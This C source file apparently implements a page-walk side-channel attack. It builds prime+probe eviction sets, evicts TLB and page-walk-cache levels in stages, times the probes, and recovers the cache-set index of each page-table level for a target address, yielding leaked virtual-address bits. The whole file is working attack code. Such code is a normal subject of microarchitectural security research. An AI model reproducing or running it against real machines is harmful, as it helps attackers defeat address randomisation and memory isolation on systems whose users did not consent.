#include <inttypes.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "pwsc.h"
#include "solver.h"
#include "evict_set.h"
#include "mapping.h"

/* PWSC Parameters */
static setup_page_walk_trigger_t setup_page_walk_trigger; 
static setup_page_walk_trigger_t pre_primeprobe_setup = NULL;
static trigger_page_walk_t trigger_page_walk; 
int64_t solver_gap_threshold; 
uint64_t trials; 

/* Order Oracle Items */
static uint64_t init_pwc_evict_size[MAX_PAGE_LEVELS] = {1920, 32, 2, 2};  // Orig 1920, 32, 4, 2 

/* Noise Filter Materials */
uint64_t noise_filter[ncache_lines] = {0};

/*
	evict_page_caches: Uses the current PWC evict size configurations to evict from the various
	PWC levels (including TLB and LLC) at a specific cache_line (set index).

	Input: order_oracle, cache_line, and the max_level to evict to 
	Output: Void 
*/
void evict_page_caches(struct orderOracle *order_oracle, uint64_t cache_line, uint64_t max_level) {
	volatile char *p = order_oracle->data + cache_line * line_size;

	/* Optimization do level 0 (TLB) without any fences */ 
	for (uint64_t i = 0; i < order_oracle->pwc_evict_sizes[0]; ++i) {
		*p = 0x5A;
		p += pagetable_region_sizes[0]; 
	}

	/* Flush the TLBs and page structure caches. */ 
	for (uint64_t level = 1; level <= max_level; ++level) {
		_mm_mfence();
		uint64_t stride = pagetable_region_sizes[level];
		p = order_oracle->data + cache_line * line_size; 

		// evict PWCs 
		for (uint64_t i = 0; i < order_oracle->pwc_evict_sizes[level]; ++i) {
 			_mm_mfence();
			*p = 0x5A;
			p += stride; 
		}
	}
}

/* 
	Auxillary function for profile_cache. This will record a set of timing measurements 
	for all line offsets (this is essentially one trial of the profile_cache) measurements. 
*/
static void __profile_cache(uint64_t target_address, 
								int64_t *timings, 
								struct orderOracle *order_oracle,
								uint64_t cur_level, 
								size_t *cache_lines) {
	volatile char *p;
	int64_t signal, noise;
	uint64_t __trash = 0; 

	int *indexes = generate_indexes(L1_WAYS);
	for (uint64_t i = 0; i < ncache_lines; ++i) {

		// set up 
		uint64_t cache_line = cache_lines[i];
		p = (char*)(cache_lines[i] * line_size);

		// generate eviction set for taget page addr
		Evict_Set *p_evict_set = init_evict_set(L1_WAYS);
		fill_evict_set((uint64_t)p, 4096, p_evict_set); 
		__trash = c_sleep(1500, __trash); 

		// collect data 
		for (uint64_t j = 0; j < nrounds; ++j) {

			signal = 0;
			noise = 0; 

			/*
				k == 0 ----> noise measurement phase
				k == 1 ----> signal measurement phase 
			*/
			if(pre_primeprobe_setup) {
				for(uint64_t k = 0; k < (rand() & MSB_MASK) + 2; k++) {
					int64_t round_signal = 0; 

					_mm_mfence(); 				
					__trash = setup_page_walk_trigger(target_address, k, __trash); 
					_mm_mfence();
					evict_page_caches(order_oracle, cache_line, cur_level);
					_mm_mfence();
					pre_primeprobe_setup(target_address, k, __trash);
					prime_evict_set(p_evict_set);
					_mm_mfence();
					__trash = trigger_page_walk(target_address, k, __trash);
					_mm_mfence();
					round_signal = probe_evict_set(p_evict_set, indexes); 
					_mm_mfence(); 

					if(k == 0) noise = round_signal;
					else signal = round_signal; 
				}
				timings[cache_line * nrounds + j] = signal - noise;
			} else {
				for(uint64_t k = 0; k < (rand() & MSB_MASK) + 2; k++) {
					int64_t round_signal = 0; 

					_mm_mfence(); 				
					__trash = setup_page_walk_trigger(target_address, k, __trash); 
					_mm_mfence();
					evict_page_caches(order_oracle, cache_line, cur_level);
					_mm_mfence();
					prime_evict_set(p_evict_set);
					_mm_mfence();
					__trash = trigger_page_walk(target_address, k, __trash);
					_mm_mfence();
					round_signal = probe_evict_set(p_evict_set, indexes); 
					_mm_mfence(); 

					if(k == 0) noise = round_signal;
					else signal = round_signal; 
				}
				timings[cache_line * nrounds + j] = signal - noise;
			}

			__trash = c_sleep(3000, __trash);
		}
		destroy_evict_set(p_evict_set); 
	}
	free(indexes);
}


/*
	Given a target address and a current page walk level to profile. This function will fill the `timings` array 
	with `trials` timing measurements for each line offset. 
*/
void profile_cache(uint64_t target_address, int64_t *timings, struct orderOracle *order_oracle, uint64_t cur_level)
{
	size_t *cache_lines;
	int64_t *line_timings;
	int64_t timing;
	size_t i, j;

	if (!(line_timings = malloc(ncache_lines * nrounds * sizeof *line_timings)))
		return;

	if (!(cache_lines = malloc(ncache_lines * sizeof *cache_lines)))
		goto err_free_line_timings;

	// init cache_lines
	for(int i = 0; i < ncache_lines; i++)
		cache_lines[i] = i; 

	// Get timings 
	for (j = 0; j < trials; ++j) {
		__profile_cache(target_address, line_timings, order_oracle, cur_level, cache_lines);

		for (i = 0; i < ncache_lines; ++i) {
			timing = 0; 
			for(uint64_t k = 0; k < nrounds; k++) // average is more stable
				timing += line_timings[i * nrounds + k]; 
			timing /= nrounds; 

			timings[j * ncache_lines + i] = timing;
		}
	}

err_free_line_timings:
	free(line_timings);
}

/* Applies the global noise filter */
void apply_noise_filter(int64_t *timings) {
	for (size_t t = 0; t < trials; ++t) {
		for(uint64_t i = 0; i < ncache_lines; i++) {
			timings[t * ncache_lines + i] -= noise_filter[i];
		}
	}
}

/* Reset noise filter */
void reset_noise_filter(void) {
	for(int i = 0; i < ncache_lines; i++)
		noise_filter[i] = 0; 
}

/* 
	Get the non buffered page --> this is the cache access 
	that is not stored in any page walker cache / TLB. This can either occur 
	from the data page access or the last level of the page walk in an invalid address. 

	This requires no PWC flushing, making it a special case. 
*/
uint64_t get_non_buffered_value(uint64_t target_address) { 
	int64_t *timings;
	struct orderOracle *order_oracle;
	uint64_t cur_pwc_evict_size[4] = {0, 0, 0, 0}; // No eviction! 

	// set up cache 
	while(!(order_oracle = new_orderOracle(cur_pwc_evict_size, pagetable_region_sizes))) {
		fprintf(stderr, "Unable to allocate order oracle sleeping then trying again...\n");
		sleep(1);
	}

	if (!(timings = malloc(trials * ncache_lines *
		sizeof *timings))) {
		printf("Failed alloc of timings\n");
		exit(1);
	}

	// return values
	uint64_t best_line = 64;
	int cnt = 0; 

	/* Try 7 times to get the nonbuffered line */
	while(best_line == ncache_lines) {
	 	if(cnt++ == 7)
	 		goto out;
		profile_cache(target_address, timings, order_oracle, 0); 
		apply_noise_filter(timings);
		solve_lines_threshold_gap(&best_line, timings, trials, solver_gap_threshold);
	}

out:
	free(timings);
	free_orderOracle(order_oracle);
	return best_line; 
}

/*
	Returns a malloc'd array of size: sizeof(uint64_t) * 5 containing the the values of the 5 page table offsets
	since the max cache line idx is 63, anything >63 means an invalid line 

	Should be freed by caller. 
*/
struct pwsc_ans run_pwsc(uint64_t target_address) {
	struct orderOracle* order_oracle;
	int64_t *timings;
	uint64_t line; 

	/* Allocate Ans */
	size_t ans_idx = 0;
	uint64_t *ans = malloc(sizeof(uint64_t) * (MAX_PAGE_LEVELS + 1)); 
	for(uint64_t i = 0; i < MAX_PAGE_LEVELS + 1; i++) 
		ans[i] = ncache_lines; // MAX INDEX

	/* Record page walk cache information */
	uint64_t cur_pwc_evict_size[] = {0, 0, 0, 0};

	/* Find non buffered cache access */
	uint64_t non_buffered_line = get_non_buffered_value(target_address);
	if(non_buffered_line != ncache_lines) {
		ans[ans_idx++] = non_buffered_line;
		fprintf(stderr, "Found a non-buffered line: %lu\n", non_buffered_line);
		noise_filter[non_buffered_line] += 2; // update filter
	} 
	else {
		fprintf(stderr, "No non-buffered line\n");
	}

	// Stuck helper 
	uint64_t line_tally[ncache_lines];
	for(uint64_t i = 0; i < ncache_lines; i++) line_tally[i] = 0;

	// Rate at which we search 
	uint64_t pl1_base_rate = 256; // default rate 
	uint64_t pl1_rate = pl1_base_rate; 
	uint64_t plx_base_rate = 2; 
	uint64_t plx_rate = plx_base_rate; 

	/* edge case items */
	uint64_t too_many_lines_stuck_cnt = 0; 
	uint64_t no_good_answer_cnt = 0;
	
	// profile 
	#define SET_PWC_FLAG set_pwc_level_size = 1
	#define UNSET_PWC_FLAG set_pwc_level_size = 0; 
	uint8_t set_pwc_level_size; SET_PWC_FLAG; 
	for (uint64_t cur_level = 0; cur_level < MAX_PAGE_LEVELS; ++cur_level) {

		// update rate for higher levels 
		if(cur_level == 2) plx_base_rate = 1; 

		// Initialize the current new levels evict set size 
		if(set_pwc_level_size) {
			cur_pwc_evict_size[cur_level] = init_pwc_evict_size[cur_level];
			UNSET_PWC_FLAG; 
		}

		// set up order oracle 
		while(!(order_oracle = new_orderOracle(cur_pwc_evict_size, pagetable_region_sizes))) {
			fprintf(stderr, "Unable to allocate order oracle sleeping then trying again...\n");
			sleep(1);
		}

		// Data storage 
		if (!(timings = malloc(trials * ncache_lines *
			sizeof *timings))) {
			free_orderOracle(order_oracle);
			continue;
		}

		// Begin profiling 
		_mm_mfence(); 
		profile_cache(target_address, timings, order_oracle, cur_level); 
		apply_noise_filter(timings);
		solve_lines_threshold_gap(&line, timings, trials, solver_gap_threshold);
		uint64_t line_rankings_sorted[ncache_lines]; 
		uint64_t num_found_lines;
		int64_t diff = solve_lines_sorted_all(line_rankings_sorted, timings, trials, solver_gap_threshold, &num_found_lines);

		/* 
			Update line tally in case we get stuck. 
			If a line has the most misses 5 times in a row just set it as the winner. 
		*/ 
		if(diff >= 25) {
			line_tally[line_rankings_sorted[0]] += 1;
			if(line_tally[line_rankings_sorted[0]] == 5) 
				line = line_rankings_sorted[0]; 
		}

		/* Noise check + Info output */
		if(line == ncache_lines) {

			/* Test if there literally is no good answer */ 
			if( (cur_level == 0 && cur_pwc_evict_size[cur_level] >= 4096) || 
				(cur_level == 1 && cur_pwc_evict_size[cur_level] >= 56) || 
				(cur_level == 2 && cur_pwc_evict_size[cur_level] >= 24) || 
				(cur_level == 3 && cur_pwc_evict_size[cur_level] >= 12)) {

				if(cur_level == 0 && init_pwc_evict_size[cur_level] < 3500) cur_pwc_evict_size[cur_level] = 2400;

				// Skip entire scan if nothing found in first two scans 
				if(cur_level == 0 && non_buffered_line == ncache_lines) cur_level = MAX_PAGE_LEVELS; 

				// move on to next level
				SET_PWC_FLAG;
				goto free_items_in_loop; 
			}

			// Update rate (Switch to a halving or something here)
			if(diff >= 25) { 
				pl1_rate = pl1_rate / 2 == 0 ? 1 : pl1_rate / 2; // Exponential backoff  
				if(cur_level >= 1) plx_rate = plx_base_rate / 2;
			}
			else { // reset 
				pl1_rate = pl1_base_rate; 
				if(cur_level >= 1) plx_rate = plx_base_rate; 
			}

			/* Complex rate changing to handle advanced cases */ 
			/* 
				if no lines found it is easy just increase by designated rate 

				if lines are found 
					if cur evict size has items then decrease current levels rate by the given rate 
					if cur evict size is 0 then decrease from previous evict size by given rate (1)  
					if both are false then whoops
			*/

			// exit condition 
			if(num_found_lines > 1 && diff < 15 && ++no_good_answer_cnt >= 20) {
				fprintf(stderr, "Unable to solve, killing it and filling in zeros\n");
				for(uint64_t i = 0; i < num_found_lines; i++) ans[ans_idx++] = 0; 
				cur_level = MAX_PAGE_LEVELS; 
				goto free_items_in_loop; 
			}

			// boost to backtracking 
			if(num_found_lines > 1 && ++too_many_lines_stuck_cnt >= 5) {
				if(cur_level == 1) cur_pwc_evict_size[0] = (cur_pwc_evict_size[0] < 32 ? 0 : cur_pwc_evict_size[0] - 32);
				else if(cur_level > 1) cur_pwc_evict_size[cur_level - 1] = (cur_pwc_evict_size[cur_level - 1] < 1 ? 0 : cur_pwc_evict_size[cur_level - 1] - 1);

				// additional boost in case it gets stuck (to cur_level - 2)
				if(too_many_lines_stuck_cnt >= 10) { 
					if(cur_level == 2) cur_pwc_evict_size[0] = (cur_pwc_evict_size[0] < 32 ? 0 : cur_pwc_evict_size[0] - 32);
					else if(cur_level > 2) cur_pwc_evict_size[cur_level - 2] = (cur_pwc_evict_size[cur_level - 2] < 1 ? 0 : cur_pwc_evict_size[cur_level - 2] - 1);
				}
			}

			// backtracking
			if(num_found_lines < 2) {
				if(cur_level == 0) cur_pwc_evict_size[cur_level] += pl1_rate; 		// increase base
				else if(cur_level >= 1) cur_pwc_evict_size[cur_level] += plx_rate; 	// update current level 

				// boost in case of over backoff
				if(num_found_lines == 0) {
					if(too_many_lines_stuck_cnt >= 10)
						cur_pwc_evict_size[0] += 16; 
					if(cur_level >= 2 && too_many_lines_stuck_cnt >= 10) 
					 	cur_pwc_evict_size[1] += 1;
				}
			}
		    else {
				if(cur_pwc_evict_size[cur_level] == 0) { // if we can't decrease current level, decrease previous level 
					if(cur_pwc_evict_size[cur_level - 1]) {
						if(cur_level-1 == 0) 
							cur_pwc_evict_size[cur_level - 1] = (cur_pwc_evict_size[cur_level - 1] < 64 ? 0 : cur_pwc_evict_size[cur_level - 1] - 64);
						else 
							cur_pwc_evict_size[cur_level - 1] = (cur_pwc_evict_size[cur_level - 1] < 1 ? 0 : cur_pwc_evict_size[cur_level - 1] - 1);
					}
				} else {
					if(cur_level == 0) 
						cur_pwc_evict_size[cur_level] = (cur_pwc_evict_size[cur_level] < 64 ? 0 : cur_pwc_evict_size[cur_level] - 64);
					else 
						cur_pwc_evict_size[cur_level] = (cur_pwc_evict_size[cur_level] < 1 ? 0 : cur_pwc_evict_size[cur_level] - 1);
				}
			}
			cur_level--; // don't move forward a level
			goto free_items_in_loop; 
		}

		// Found a line --> reset line_tally
		for(uint64_t i = 0; i < 64; i++) line_tally[i] = 0;

		/* Boost next level */
		if(too_many_lines_stuck_cnt < 5) {
			if(cur_level == 0) cur_pwc_evict_size[cur_level] += 256; 
			else if(cur_level == 1) { 
				cur_pwc_evict_size[0] += 128; 
				cur_pwc_evict_size[1] += 8; // 16
			}
			else if(cur_level == 2) {
				cur_pwc_evict_size[1] += 10;
				cur_pwc_evict_size[2] += 6;
			}
		} 

		/* Reset back off and exit counts */
		too_many_lines_stuck_cnt = 0;
		no_good_answer_cnt = 0; 

		/* Reset Rates */
		pl1_rate = pl1_base_rate;
		plx_rate = plx_base_rate;

		/* Update the Noise Filter to mask out what we have seen already */
		noise_filter[line] += 2;

		/* Update ans */
		ans[ans_idx++] = line; 

		/* Make sure PWC sizes get updated */
		SET_PWC_FLAG; 

		/* Output */
		fprintf(stderr, "Found line %lu with diff %ld\n", line, diff);

free_items_in_loop:
		fflush(stdout);	

		free(timings);

		free_orderOracle(order_oracle);
	}

	/* Construct answer */
	uint64_t levels_found = ans_idx; 
	uint64_t found_lines[MAX_PAGE_LEVELS + 1] = {0}; 
	uint64_t found_idx = 0;
	for(int i = levels_found - 1; i >= 0; i--) { // Ans was filled in reverse order
		found_lines[found_idx++] = ans[i];
	}

	// Fill order based on TLB info
	virtual_address_t va; va.va = 0; 
	va.vpn4_set = found_lines[0];
	va.vpn3_set = found_lines[1];
	va.vpn2_set = found_lines[2];
	va.vpn1_set = found_lines[3];
	va.po_set   = found_lines[4];
	struct pwsc_ans ret = {
		.num_lines_found = levels_found,
		.va = va 
	};
	free(ans); 
	return ret;
}

/* Additional Constructor for a pre prime+probe step */
void pwsc_init_reset(
	setup_page_walk_trigger_t spwt, 
	setup_page_walk_trigger_t pre_pp, 
	trigger_page_walk_t tpw,
	uint64_t input_init_pwc_sizes[MAX_PAGE_LEVELS],
	int64_t input_solver_gap_threshold,
	uint64_t input_trials) {

	// init checks 
	assert(ncache_lines == 64 && "We only support 64 sets so far");

	// Page Walk Trigger Interface Setup 
	setup_page_walk_trigger = spwt;
	trigger_page_walk = tpw; 
	pre_primeprobe_setup = pre_pp; 

	// reset the noise_filter
	reset_noise_filter(); 

	// set init evict values 
	for(int i = 0; i < MAX_PAGE_LEVELS; i++)
		init_pwc_evict_size[i] = input_init_pwc_sizes[i]; 

	// gap threshold 
	solver_gap_threshold = input_solver_gap_threshold; 

	// trials
	trials = input_trials; 

	// Parameter Output
	fprintf(stderr, "Pre_pp? %s\tthreshold: %ld\ttrials: %lu\tinit evict: %lu %lu %lu %lu\n", (pre_primeprobe_setup ? "yes" : "no"), solver_gap_threshold, input_trials, init_pwc_evict_size[0], init_pwc_evict_size[1], init_pwc_evict_size[2], init_pwc_evict_size[3]);
}

/* Teardown */
void pwsc_destroy(void) {	
	// TODO who needs teardown anyways lol
	// Virtual memory is fake anyways :D 
}
